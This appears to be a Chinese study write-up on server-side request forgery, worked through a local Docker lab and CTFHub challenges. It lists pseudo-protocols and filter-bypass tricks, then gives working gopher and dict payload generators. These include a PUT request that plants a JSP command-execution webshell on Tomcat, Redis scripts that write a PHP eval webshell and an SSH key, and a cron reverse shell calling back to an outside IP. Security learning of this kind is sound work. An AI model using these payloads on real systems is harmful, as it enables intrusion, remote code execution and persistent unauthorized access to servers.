**SSRF**(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞,本质是一个信息泄露的漏洞。 一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统），形成原因大部分时因为服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤和限制。 
## 有可能会有ssrf漏洞的地方
- 从指定url地址获取网页文本内容
- 加载指定地址的图片，下载
- 百度识图/加载，给出url就能识别出图片，加载图片
- 转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览
- 在线翻译：给网址翻译对应网页的内容
- 图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验
- 云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试
- 网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作
- 从远程服务器请求资源
- 编码处理、属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等
- 未公开的api实现以及其他扩展调用URL的功能：可以利用google语法加上这些关键字去寻找SSRF漏洞。一些的url中的关键字有：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……
## 原理
![](/image/84.png)
主机A提供了公网服务，可以直接访问，但攻击者无法直接访问B,可以借助A主机来攻击B主机，这就是SSRF的攻击方式。所以一般情况下，SSRF的攻击目标是攻击者无法直接访问的内网系统。
## 内网外网
**内网**:「内部专用网络」，仅限特定范围（如家庭、公司、学校）内的设备互相访问，外部网络无法直接连接。 **外网(公网)**:「全球公开网络」，连接全世界的设备（服务器、个人设备等），是不同内网之间通信的桥梁。
## SSRF常用伪协议
- `file://`从文件系统中获得文件内容，如`file:///etc/passwd`
- `dict://`字典服务协议，访问字典资源，如`dict://ip:6739/info`
- `ftp://`用于网络端口扫描
- `sftp://`SSH文件传输协议或安全文件传输协议
- `ldap://`轻量级目录访问协议
- `tftp://`简单文件传输协议
- `gopher://`分布式文档传递服务，可以利用gopher://伪协议发送get,post请求。基本格式`URL:gopher://<host><port>/<gopher-path>`gopher协议默认端口70,web需要加端口号80.
- `https://`探测内网主机存活。
## SSRF漏洞产生函数
- **file_get_contents()**：支持多协议，用户传入`http://内网IP`或`file:///etc/passwd`即可触发，可以用于读取文件。
- **curl_exec()**：cURL 库，支持`http`/`https`/`gopher`/`dict`等协议，可构造复杂 SSRF 请求，curl_init(url)函数初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。
- **fopen()**：与`file_get_contents`类似，打开远程 / 本地资源
- **fsockopen()**：手动创建 socket 连接，可指定内网 IP + 端口，探测内网服务，如果`fsockopen()`中的`$host`输入`www.baidu.com`会直接回显百度主页。
- **readfile()**：输出远程 / 本地文件内容，支持多协议
## 常见内网端口及其作用
| 端口    | 服务                  | 说明                  |
| ----- | ------------------- | ------------------- |
| 21    | FTP                 | 文件传输                |
| 22    | SSH                 | 远程登录                |
| 23    | Telnet              | 明文远程登录              |
| 25    | SMTP                | 邮件发送                |
| 53    | DNS                 | 域名解析                |
| 80    | HTTP                | Web 服务              |
| 110   | POP3                | 邮件接收                |
| 143   | IMAP                | 邮件接收                |
| 443   | HTTPS               | 加密 Web 服务           |
| 445   | SMB                 | Windows 文件共享        |
| 1433  | MSSQL               | SQL Server 数据库      |
| 1521  | Oracle              | Oracle 数据库          |
| 2181  | ZooKeeper           | 分布式协调服务             |
| 2375  | Docker API          | Docker 远程管理（未授权风险高） |
| 3306  | MySQL               | MySQL 数据库           |
| 3389  | RDP                 | Windows 远程桌面        |
| 4848  | GlassFish           | Java EE 管理控制台       |
| 5432  | PostgreSQL          | PostgreSQL 数据库      |
| 5601  | Kibana              | 日志可视化               |
| 5672  | RabbitMQ            | 消息队列                |
| 6379  | Redis               | 缓存数据库（常见未授权）        |
| 7001  | WebLogic            | Oracle WebLogic 管理  |
| 8080  | HTTP 备用             | Tomcat / 代理常用端口     |
| 8443  | HTTPS 备用            | 管理后台常用              |
| 8161  | ActiveMQ            | 消息队列管理台             |
| 8500  | Consul              | 服务发现                |
| 9000  | FastCGI / SonarQube | PHP-FPM 或代码质量平台     |
| 9090  | Prometheus          | 监控系统                |
| 9200  | Elasticsearch       | 搜索引擎（常见未授权）         |
| 11211 | Memcached           | 缓存服务                |
| 27017 | MongoDB             | 文档数据库               |
| 50070 | Hadoop              | HDFS NameNode 管理    |
## SoapClient
SOAP是简单对象访问协议，简单对象访问协议（SOAP）是一种轻量的、简单的、基于 XML 的协议，它被设计成在 WEB 上交换结构化的和固化的信息。PHP 的 SoapClient 就是可以基于SOAP协议可专门用来访问 WEB 服务的 PHP 客户端。
SoapClient是一个php的内置类，当其进行反序列化时，如果触发了该类中的`__call`方法，那么`__call`便方法可以发送HTTP和HTTPS请求。该类的构造函数如下：
```
public SoapClient :: SoapClient(mixed $wsdl [，array $options ])
```
- 第一个参数是用来指明是否是wsdl模式。
- 第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而 uri 是SOAP服务的目标命名空间。
根据这个就可以利用一个ssrf漏洞。
源码
```php
// text.php
<?php
$a = new SoapClient(null,array('uri'=>'http://121.89.81.39:2333', 'location'=>'http://121.89.81.39:2333/aaa'));
$b = serialize($a);
echo $b;
$c = unserialize($b);
$c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
?>
```
访问`/text.php`（要打开soap的php扩展）就可以在服务器监听到数据
![](/image/266.png)
这样就触发了ssrf，但是仅限于http/https协议。
## 相关协议的利用
搭建靶场，先进入wsl kali-linux,再进入靶场文件`cd /mnt/wsl/old(1)/ssrf_vul-old`再`docker-compose up -d`启动，记得提前把docker-desktop打开，启动成功后访问`http://192.168.240.207:8080/`即宿主机ip:端口(默认8080)
进入靶场，可以看到是一个站点快照获取界面，可以试一下输入`http://www.baidu.com/robots.txt`![](/image/85.png)可以猜到很有可能有ssrf漏洞。
1. **首先**可以试着用file://伪协议读取一点东西
    - `/etc/passwd`读取文件passwd
    - `/etc/hosts`显示当前操作系统网卡ip
    - `/proc/net/arp`显示arp缓存表（寻找内网其他主机）
    - `/proc/net/fib_trie`显示当前网段路由信息
2. 读取`/etc/passwd`试一下，`file:///etc/passwd`读取成功。
3. 接下来查这台主机所处的内网网段是多少，读取`file:///etc/hosts`可以看到![](/image/86.png)可以看到有一张处于172.72.23.网段的网卡
4. 接下来用`file:///proc/net/arp`看内网里有哪些主机是存活的，读取出来是空的。是因为只有进行通信后才会有arp表，可以尝试访问内网里的所有ip,可以把1-254访问一遍。可以用bp爆破，发现有一些是存活的![](/image/87.png)21-24是开着的
5. 接下来要查看内网主机开放了哪些端口，使用dict://伪协议。还是用bp爆破，因为这次爆破要同时爆破两个，所以爆破模式要用cluster bomb(集束炸弹),爆破设置![](/image/88.png)![](/image/89.png)列表里输入几个常见的端口，最后通过长度看端口是否开启，![](/image/90.png)可以看到21-24的80端口都是开的。有回显内容。
6. 接下来可以通过http协议进行目录扫描，因为是用来打内网，所以不可以使用dirsearch扫描。用bp爆破`http://172.72.23.22/1.php`，字典就用kali自带的字典，kali里`/usr/share/wordlists/dirb/commont.txt`根据长度判断，扫到三个`index.php shell.php phpinfo.php`也可以把后缀同时爆破一下，例如txt,zip,php等
7. 发现shell.php里有![](/image/93.png)要发送get请求，可以借助gopher伪协议发送get,post请求(get请求可以直接`http://172.72.23.22/shell.php?cmd=cat%20flag`,但是post只可以用gopher)。但是gopher发送请求时有一个问题，![](/image/91.png)![](/image/92.png)可以看到他自动把第一个字符吞掉了。所以用gopher时要在第一位填充一个没用的字符占位。
   首先**get请求**poc构造:需要保留头部信息
   路径 GET /shell.php HTTP/1.1
     目标ip地址 Host: 172.72.23.22(记得在最后一定加一个换行符，因为post内容和头部信息之间有一个空行)
      最终构造的payload`gopher://172.72.23.22:80/_GET%20/shell.php%3fcmd=cat%20flag%20HTTP/1.1%0d%0AHost:%20172.72.23.22%0d%0A`(我不知道是哪里错了，就是成功不了)可以发送get提交，但有另一种方式可以，就是发送到repeater模块后对构造好的内容进行url编码![](/image/94.png)复制这一段内容到`gopher%3A%2F%2F172.72.23.22%3A80%2F_`后,对这一段内容进行两次url编码(因为可访问的服务器要进行一次url解码，内网主机也要进行一次url解码)，发送成功![](/image/95.png)记得把回车符也复制粘贴上，url编码时也要把后面的回车符带上  
8. 如果要发送post
```
POST /shell.php HTTP/1.1
Host: 172.72.23.22
Content-Length: 6  
Content-Type: application/x-www-form-urlencoded   

cmd=ls
```
道理同上
**扫描内网端口（http/s和dict协议）**：
我们利用dict协议构造如下payload即可查看内网主机上开放的端口及端口上运行服务的版本信息等：
```
ssrf.php?url=dict://192.168.52.131:6379/info   // redis  
ssrf.php?url=dict://192.168.52.131:80/info     // http  
ssrf.php?url=dict://192.168.52.130:22/info   // ssh
```

## 常见绕过手法
例题都是ctfhub上的。
### 回环地址绕过
题目要访问127.0.0.1下的flag.php但访问后失败了，这时就要绕过，一般ip地址都是用点分十进制，但是ip地址是可以用二进制，八进制，十六进制的。127.0.0.1转二进制是`0b01111111000000000000000000000001`转八进制`017700000001`转十六进制`0x7f000001`纯十进制表达方式是`2130706433`,这些都可以通过计算器的程序员模式计算。只要把`http://127.0.0.1/flag.php`里的127.0.0.1替换成上述任意一个就行。
还有就是`localhost`和`127.0.0.1`是等价的。
```
http://localhost/         # localhost就是代指127.0.0.1  
http://0/                 # 0在window下代表0.0.0.0，而在liunx下代表127.0.0.1  
http://[0:0:0:0:0:ffff:127.0.0.1]/    # 在liunx下可用，window测试了下不行  
http://[::]:80/           # 在liunx下可用，window测试了下不行  
http://127。0。0。1/       # 用中文句号绕过  
http://①②⑦.⓪.⓪.①  
http://127.1/  
http://127.00000.00000.001/ # 0的数量多一点少一点都没影响，最后还是会指向127.0.0.1
```
### 302跳转 Bypass
file读取一下index.php有一句`if (preg_match("/127\|172\|10\|192/", $url)) {exit("hacker! Ban Intranet IP");}`但是没有禁止localhost,可以用`localhost/flag.php`当然了也可以用十六进制绕过。但这道题真正考的是302跳转，可以用一下自己的服务器试一下，开启我的服务器，在网页目录写一个302.php，也就是![](/image/111.png)内容是
```php
<?php
header("Location:http://127.0.0.1/flag.php");//实现重定向到http://127.0.0.1/flag.php
```
最终![](/image/112.png)paylaod就是`http://[公网ip]/302.php`
**还有别的方法**，网络上存在一个很神奇的服务，网址为 [http://xip.io](http://xip.io/)，当访问这个服务的任意子域名的时候，都会重定向到这个子域名，举个例子：
当我们访问：[http://127.0.0.1.xip.io/flag.php](http://127.0.0.1.xip.io/flag.php)时，实际访问的是[http://127.0.0.1/flag.php](http://127.0.0.1/flag.php)。像这种网址还有[http://nip.io](http://nip.io/)，[http://sslip.io](http://sslip.io/)。
**短地址跳转绕过**：
这里也给出一个网址 [https://4m.cn/](https://4m.cn/)：（但是这个网址好像丝了）
直接使用生成的短连接 [https://4m.cn/FjOdQ](https://4m.cn/FjOdQ)就会自动302跳转到 [http://127.0.0.1/flag.php](http://127.0.0.1/flag.php)上，这样就可以绕过WAF了：

### URL Bypass

这道题说url必须以http://notfound.ctfhub.com开头，但要访问的是127.0.0.1这里要用到一个技巧，就是`http://127.0.0.1@www.baidu.com`这里127.0.0.1作为用户名，www.baidu.com作为主机名，实际上访问的还是`www.baidu.com`![](/image/108.png)所以只要输入`http://notfound.ctfhub.com@127.0.0.1/flag.php`
### DNS重绑定攻击
**原理**:利用服务器两次DNS(将域名解析为ip地址)解析同一域名的时间间隙，更换域名后的ip,达到突破同源策略或绕过waf进行ssrf的目的。
**攻击方式**：第一次DNS解析的ip设为合法ip以绕过host合法性检查,第二次DNS解析的ip设为内网ip.DNS第二次解析时更换url对应的ip，在TTL（域名和ip绑定绑定关系的Cache存活的最长时间）结束，缓存失效后，重新访问此url就能获取被更换后的ip,这样ssrf就访问到内网了。并且这一过程域名不变，绕过浏览器的安全检测。
这里有一个[网站](https://lock.cmpxchg8b.com/rebinder.html)可以提供TTL为零的DNS解析，可以生成一个DNS解析，![](/image/98.png)把生成的域名放输入框里，`http://deb74166.7f000001.rbndr.us/flag.php`点击提交，有概率成功，可以多试几次。
### 利用不存在的协议头绕过指定的协议头
源码
```php
<?php  
highlight_file(__FILE__);  
if(!preg_match('/^https/is',$_GET['url'])){  
die("no hack");  
}  
echo file_get_contents($_GET['url']);  
?>
```
`ssrf.php?url=httpsssss://../../../../../../etc/passwd`此时`file_get_contents()`函数遇到了不认识的伪协议头“httpsssss://”，就会将他当做文件夹，然后再配合目录穿越即可读取文件。
这个方法可以在SSRF的众多协议被禁止且只能使用它规定的某些协议的情况下来进行读取文件。
### 利用URL的解析问题
利用readfile和parse_url函数的解析差异以及curl和parse_url解析差异来进行绕过。
源码
```php
<?php
$url = 'http://'. $_GET['url'];
$parsed = parse_url($url);
if( $parsed['port'] == 80 ){  // 这里限制了我们传过去的url只能是80端口的
    readfile($url);
} else {
    die('Hacker!');
}
```
在当前界面用python开一个http服务，端口为2333，`python -m http.server 2333`
只要传参`?url=127.0.0.1:2333:80/flag.txt`就可以得到flag
原理是
![](/image/267.png)
可以看到readfile函数获取的是，最后冒号前的一部分，而`parse_url`获取的是最后一个冒号后面的端口。利用这种差异的不同，从而绕过WAF。
这两个函数在解析host的时候也有差异，如下图：![](/image/268.png)
readfile函数获取的是`@`后面的部分，而`parse_url`获取的是`@`号前面的部分。利用这种差异的不同，我们可以绕过题目中parse_url()函数对指定host的限制。
**利用curl和parse_url的解析差异绕指定的host**：
原理
![](/image/269.png)
可以看到curl()解析的是第一个@后的网址，而`parse_url`解析的是第二个@后面的网址。
用这个原理我们可以绕过题目中parse_url()函数对指定host的限制。
测试代码
```php
// ssrf.php
<?php
highlight_file(__FILE__);
function check_inner_ip($url)
{
    $match_result=preg_match('/^(http|https)?:\/\/.*(\/)?.*$/',$url);
    if (!$match_result)
    {
        die('url fomat error');
    }
    try
    {
        $url_parse=parse_url($url);
    }
    catch(Exception $e)
    {
        die('url fomat error');
        return false;
    }
    $hostname=$url_parse['host'];
    $ip=gethostbyname($hostname);
    $int_ip=ip2long($ip);
    return ip2long('127.0.0.0')>>24 == $int_ip>>24 || ip2long('10.0.0.0')>>24 == $int_ip>>24 || ip2long('172.16.0.0')>>20 == $int_ip>>20 || ip2long('192.168.0.0')>>16 == $int_ip>>16;// 检查是否是内网ip
}
function safe_request_url($url)
{
    if (check_inner_ip($url))
    {
        echo $url.' is inner ip';
    }
    else
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        $output = curl_exec($ch);
        $result_info = curl_getinfo($ch);
        if ($result_info['redirect_url'])
        {
            safe_request_url($result_info['redirect_url']);
        }
        curl_close($ch);
        var_dump($output);
    }
}
$url = $_GET['url'];
if(!empty($url)){
    safe_request_url($url);
}
?>
```
上述代码中可以看到`check_inner_ip`函数通过`parse_url()`函数检测是否为内网IP，如果不是内网 IP ，则通过`curl()`请求 url 并返回结果，我们可以利用curl和parse_url解析的差异不同来绕过这里的限制，让`parse_url()`处理外部网站网址，最后`curl()`请求内网网址。paylaod如下：
```
?url=http://@127.0.0.1:80@www.baidu.com/flag.php
```
## gopher伪协议发送请求
发送get请求，和post请求原理一样的。

先看一下网页里有哪些文件，用bp字典爆破，爆破出一个flag.php和index.php，![](/image/101.png)看wp好像还有一个302.php没爆出来，访问flag.php得到一个`<!-- Debug: key=2b5fe797888b5363a85c8595bb5b774f-->`,index.php的内容可以用file://伪协议读取出来，
```php
|   |
|---|
|<?php|
||
|error_reporting(0);|
||
|if (!isset($_REQUEST['url'])){|
|header("Location: /?url=_");|
|exit;|
|}|
||
|$ch = curl_init();|
|curl_setopt($ch, CURLOPT_URL, $_REQUEST['url']);|
|curl_setopt($ch, CURLOPT_HEADER, 0);|
|curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);|
|curl_exec($ch);|
|curl_close($ch);|
```
再读一下flag.php源码，
```php
|   |
|---|
|<?php|
||
|error_reporting(0);|
||
|if ($_SERVER["REMOTE_ADDR"] != "127.0.0.1") {|
|echo "Just View From 127.0.0.1";|
|return;|
|}|
||
|$flag=getenv("CTFHUB");|
|$key = md5($flag);|
||
|if (isset($_POST["key"]) && $_POST["key"] == $key) {|
|echo $flag;|
|exit;|
|}|
|?>|
||
|<form action="/flag.php" method="post">|
|<input type="text" name="key">|
|<!-- Debug: key=<?php echo $key;?>-->|
|</form>|
```
读取302.php源码
```php
<?php if(isset($_GET['url'])){ header("Location: {$_GET[‘url‘]}"); exit; } highlight_file(__FILE__);
```
可以用gopher伪协议发送post请求，构造poc
```
POST /flag.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 36
Content-Type: application/x-www-form-urlencoded

key=2b5fe797888b5363a85c8595bb5b774f
```
把他两次url编码发送得到flag![](/image/102.png)但这个flag好像是个彩蛋flag,它提示我环境过期了，但是没过期，不知道咋办了，找到解决方法了，把
```
POST /flag.php HTTP/1.1
Host: 127.0.0.1:80
Content-Length: 36
Content-Type: application/x-www-form-urlencoded

key=d37598d50c0af4117e7caf76cd317b69
```
先用hackbar一次url编码，只编码特殊字符，编码后把%0A替换成%0D%0A,因为 Gopher协议包含的请求数据包中，可能包含有`=`、`&`等特殊字符，避免与服务器解析传入的参数键值对混淆，所以对数据包进行 URL编码，这样服务端会把`%`后的字节当做普通字节。再进行一次url编码，得到payload`http://challenge-1f215c1c97a2b737.sandbox.ctfhub.com:10800/?url=gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost:%2520127.0.0.1:80%250D%250AContent-Length:%252036%250D%250AContent-Type:%2520application/x-www-form-urlencoded%250D%250A%250D%250Akey=d37598d50c0af4117e7caf76cd317b69`得到真正的flag![](/image/103.png)再写仔细一点。就是先对原来的poc进行一次url编码，不能用hackbar编码，可以用[在线URL解码编码工具_蛙蛙工具](https://www.iamwawa.cn/urldecode.html)进行编码，因为这个`encodeURI` 方法不会对ASCII字母、数字、`~!@#$&*()=:/,;?+'` 编码,之前一直不成就是因为这个。一次编码后得到
~~~
POST%20/flag.php%20HTTP/1.1%0AHost:%20127.0.0.1:80%0AContent-Length:%2036%0AContent-Type:%20application/x-www-form-urlencoded%0A%0Akey=d37598d50c0af4117e7caf76cd317b69
~~~
再把%0A替换为%D%0A,得到
```
POST%20/flag.php%20HTTP/1.1%0D%0AHost:%20127.0.0.1:80%0D%0AContent-Length:%2036%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Akey=d37598d50c0af4117e7caf76cd317b69
```
再进行一次url编码，得到
```
POST%2520/flag.php%2520HTTP/1.1%250D%250AHost:%2520127.0.0.1:80%250D%250AContent-Length:%252036%250D%250AContent-Type:%2520application/x-www-form-urlencoded%250D%250A%250D%250Akey=d37598d50c0af4117e7caf76cd317b69
```
这就是最终paylaod.(因为编码问题卡好久)
但看其他师傅的文章，找到一个很好的解决办法。就是直接用一个脚本，不用一次一次的手动改了，
```python
import urllib.parse  
  
test=\  
"""POST /flag.php HTTP/1.1  
Host: 127.0.0.1:80  
Content-Length: 36  
Content-Type: application/x-www-form-urlencoded  
  
key=d9b73820ff0c94a0c34db8c3d328626d  
"""  
#后面一定要有回车，回车表示http请求结束。  
tmp = urllib.parse.quote(test)  
new = tmp.replace("%0A","%0D%0A")  
result = 'gopher://127.0.0.1:80/_'+urllib.parse.quote(new)  
print(result)
```
这样payload就一步到位了。
## XXE
`http://172.72.23.25`存在XXE漏洞，看源码里有
```
var data = "<user><username>" + username + "</username><password>" + password + "</password></user>";
```
用的是post请求。
脚本
```python
import urllib.parse  
  
test=\  
"""POST /index.php HTTP/1.1  
Host: 172.72.23.25  
Content-Type: application/xml;charset=utf-8  
Content-Length: 123  
  
<!DOCTYPE root[<!ENTITY niu SYSTEM "file:///etc/passwd">]><user><username>&niu;</username><password>admin</password></user>  
"""  
#后面一定要有回车，回车表示http请求结束。  
tmp = urllib.parse.quote(test)  
new = tmp.replace("%0A","%0D%0A")  
result = 'gopher://172.72.23.25:80/_'+urllib.parse.quote(new)  
print(result)
```
得到payload
## Tomcat
`http://172.72.23.26`的8080端口。
这个涉及到CVE-2017-12615
配置文件readonly=false会导致漏洞
根据设计，Apache Tomcat 服务器不允许通过 PUT 方法上传 JSP 文件。这很可能是为了防止攻击者上传 JSP shell 并远程执行服务器上的代码而采取的安全措施。然而，由于安全检查不足，攻击者可以通过精心构造的 HTTP 请求，在启用了 PUT 功能的 Tomcat 7.0 到 79 版本服务器上，利用 PUT 方法远程执行代码。
要构造一个put请求
用脚本生成
```python
import urllib.parse  
  
test=\  
"""PUT /777.jsp/ HTTP/1.1  
Host: 172.72.23.26:8080  
Accept: */*  
Accept-Language: en  
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)  
Connection: close  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 5  
  
shell  
"""  
#后面一定要有回车，回车表示http请求结束。  
tmp = urllib.parse.quote(test)  
new = tmp.replace("%0A","%0D%0A")  
result = 'gopher://172.72.23.26:8080/_'+urllib.parse.quote(new)  
print(result)
```
发送后回显201就是写入成功了，再访问/777.jsp，就可以看到内容，但是要想写入木马，就得
```python
import urllib.parse  
  
test=\  
"""PUT /888.jsp/ HTTP/1.1  
Host: 172.72.23.26:8080  
Accept: */*  
Accept-Language: en  
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)  
Connection: close  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 462  
  
<%  
    String command = request.getParameter("cmd");    if(command != null)    {        java.io.InputStream in=Runtime.getRuntime().exec(command).getInputStream();        int a = -1;        byte[] b = new byte[2048];        out.print("<pre>");        while((a=in.read(b))!=-1)        {            out.println(new String(b));        }        out.print("</pre>");    } else {        out.print("format: xxx.jsp?cmd=Command");    }%>  
"""  
#后面一定要有回车，回车表示http请求结束。  
tmp = urllib.parse.quote(test)  
new = tmp.replace("%0A","%0D%0A")  
result = 'gopher://172.72.23.26:8080/_'+urllib.parse.quote(new)  
print(result)
```
得到payload,发送后就成功注入木马，再`url=http://172.72.23.26:8080/888.jsp?cmd=env`就可以命令执行了。
## redis未授权写入webshell
内网的 172.72.23.27 主机上的 6379 端口运行着未授权的 Redis 服务，系统没有 Web 服务（无法写 Shell），无 SSH 公私钥认证（无法写公钥），所以这里攻击思路只能是使用定时任务来进行攻击了。常规的攻击思路的主要命令如下：
先通过`docker exec -it 540df3c381f6 bash`进入对应主机的控制台，再`redis-cli -h 172.72.23.27`进入redis-cli界面。
```bash
#清空key
flushall
#设置要操作的路径为定时任务目录（一般为网页根目录）
config set dir /var/spool/cron/
# 设置文件名
config set dbfilename phpinfo.php
#写入木马
set payload "<?php phpinfo();?>"
# 设置定时任务内容(反弹shell)
set x "\n* * * * * /bin/bash -i >%26 /dev/tcp/121.89.81.39/2333 0>%261\n"
#保存操作
save
```
这样就会写入成功。
但是我们攻击环境下不可以用`redis-cli`，但可以用dict和gopher伪协议，用gopher伪协议十分复杂，可以先用dict。
/var/spool/cron/是 Linux 系统默认的 crontab 配置文件存放目录，每个用户的定时任务都会以**用户名**为文件名保存在这里（比如 root 用户的任务文件是 `/var/spool/cron/root`）；写入这个目录的 cron 文件会被 cron 服务自动加载，定时执行里面的命令。
格式如下
```bash
dict://x.x.x.x:6379/<Redis 命令>
```
下面开始直接使用 dict 协议操作。
```bash
# 清空 key
dict://172.72.23.27:6379/flushall

# 设置要操作的路径为定时任务目录
dict://172.72.23.27:6379/config set dir /var/spool/cron/

# 在定时任务目录下创建 root 的定时任务文件
dict://172.72.23.27:6379/config set dbfilename phpinfo.php

# 写入 Bash 反弹 shell 的 payload
dict://172.72.23.27:6379/set payload "<?php@eval(POST_['cmd']);phpinfo();?>"

# 保存上述操作
dict://172.72.23.27:6379/save
```
SSRF 传递的时候记得要把 `&` URL 编码为 `%26`，上面的操作最好再 BP 下抓包操作，防止浏览器传输的时候被 URL 打乱编码
这样就可以成功
也可以用gopher伪协议。
这个可以用一个脚本把他转换为gopher伪协议的形式（抄别人的，用的是python2）
```python
import urllib  
protocol="gopher://"  
ip="172.72.23.27"  
port="6379"  
shell="\n\n<?php eval($_POST[\"cmd\"]);?>\n\n"  
filename="shell6.php"  
path="/var/www/html"  
passwd=""  
cmd=["flushall",  
     "set 1 {}".format(shell.replace(" ","${IFS}")),  
     "config set dir {}".format(path),  
     "config set dbfilename {}".format(filename),  
     "save"  
     ]  
if passwd:  
    cmd.insert(0,"AUTH {}".format(passwd))  
payload=protocol+ip+":"+port+"/_"  
def redis_format(arr):  
    CRLF="\r\n"  
    redis_arr = arr.split(" ")  
    cmd=""  
    cmd+="*"+str(len(redis_arr))  
    for x in redis_arr:  
       cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")  
    cmd+=CRLF  
    return cmd  
  
if __name__=="__main__":  
    for x in cmd:  
       payload += urllib.quote(redis_format(x))  
        payload = urllib.quote(payload)  
    print payload
```
这样就可以成功写入。![](/image/273.png)
也可以用这个脚本构造反弹shell,创建计划任务。**这个只能在Centos上使用，别的不行，好像是由于权限的问题。**
```python
import urllib  
protocol="gopher://"  
ip="172.72.23.27"  
port="6379"  
reverse_ip="121.89.81.39"  
reverse_port="2333"  
cron="\n\n\n\n*/1 * * * * bash -i >& /dev/tcp/%s/%s 0>&1\n\n\n\n"%(reverse_ip,reverse_port)  
filename="root"  
path="/var/spool/cron"  
passwd=""  
cmd=["flushall",  
     "set 1 {}".format(cron.replace(" ","${IFS}")),  
     "config set dir {}".format(path),  
     "config set dbfilename {}".format(filename),  
     "save"  
     ]  
if passwd:  
    cmd.insert(0,"AUTH {}".format(passwd))  
payload=protocol+ip+":"+port+"/_"  
def redis_format(arr):  
    CRLF="\r\n"  
    redis_arr = arr.split(" ")  
    cmd=""  
    cmd+="*"+str(len(redis_arr))  
    for x in redis_arr:  
       cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")  
    cmd+=CRLF  
    return cmd  
  
if __name__=="__main__":  
    for x in cmd:  
       payload += urllib.quote(redis_format(x))  
        payload = urllib.quote(payload)  
    print payload
```
提交后就会得到反弹的shell![](/image/274.png)
## redis未授权写SSH公钥
系统没有 Web 服务（无法写 Shell），无 SSH 公私钥认证（无法写公钥），但是我抄了一下大佬的博客，看怎么写SSH公钥。
同样，我们也可以直接这个存在Redis未授权的主机的~/.ssh目录下写入SSH公钥，直接实现免密登录，但前提是~/.ssh目录存在，如果不存在我们可以写入计划任务来创建该目录。
用脚本生成payload
```python
import urllib  
protocol="gopher://"  
ip="192.168.52.131"  
port="6379"  
ssh_pub="\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E/45IEs/9a6AWfXb6iwzo+D62y8MOmt+sct27ZxGOcRR95FT6zrfFxqt2h56oLwml/Trxy5sExSQ/cvvLwUTWb3ntJYyh2eGkQnOf2d+ax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH/4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd/bWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ/NnHKyWtI/OzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe+XqQnjxtk4giopiFfRu8winE9scqlIA5Iu/d3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg/OOhoA3iKNhJ/JT31TU9E24dGh2Ei8K+PpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl+SOsVHpNqwFcrgsq/WR5BGqnu54vTTdJh0pSrl+tniHEnWWU= root@whoami\n\n"  
filename="authorized_keys"  
path="/root/.ssh/"  
passwd=""  
cmd=["flushall",  
     "set 1 {}".format(ssh_pub.replace(" ","${IFS}")),  
     "config set dir {}".format(path),  
     "config set dbfilename {}".format(filename),  
     "save"  
     ]  
if passwd:  
    cmd.insert(0,"AUTH {}".format(passwd))  
payload=protocol+ip+":"+port+"/_"  
def redis_format(arr):  
    CRLF="\r\n"  
    redis_arr = arr.split(" ")  
    cmd=""  
    cmd+="*"+str(len(redis_arr))  
    for x in redis_arr:  
       cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")  
    cmd+=CRLF  
    return cmd  
  
if __name__=="__main__":  
    for x in cmd:  
       payload += urllib.quote(redis_format(x))  
        payload = urllib.quote(payload)  
    print payload
```
一旦写入成功，就可以`ssh root@目标IP`免密登入目标服务器。
其中公钥可以再本地生成`ssh-keygen -t rsa`保存在`~/.ssh`目录下。
```
~/.ssh/id_rsa        # 私钥
~/.ssh/id_rsa.pub    # 公钥
```
原理就是，服务器会验证，你有没有对应的**私钥**，而我这边是否存着匹配的**公钥**
私钥签名的数据，只能用对应的公钥验证，但是公钥无法推导出私钥。
我本地生成的公钥私钥是天然配对的。如果我的私钥和服务器的公钥是配对的，就可以免密登录。但是肯定不配对，就需要在服务器写入自己的公钥。这样就配对了。
SSH 使用的是 **非对称加密（密钥对）**：
- 🔑 **私钥（id_rsa）**：只在你自己电脑上
- 🔓 **公钥（id_rsa.pub）**：放在服务器的
    `~/.ssh/authorized_keys`
1. 用命令：
	`ssh root@目标IP`
2. 客户端用我的 **私钥** 对一段数据进行签名
3. 服务器读取：
    `/root/.ssh/authorized_keys`
4. 服务器用里面的 **公钥** 验证签名
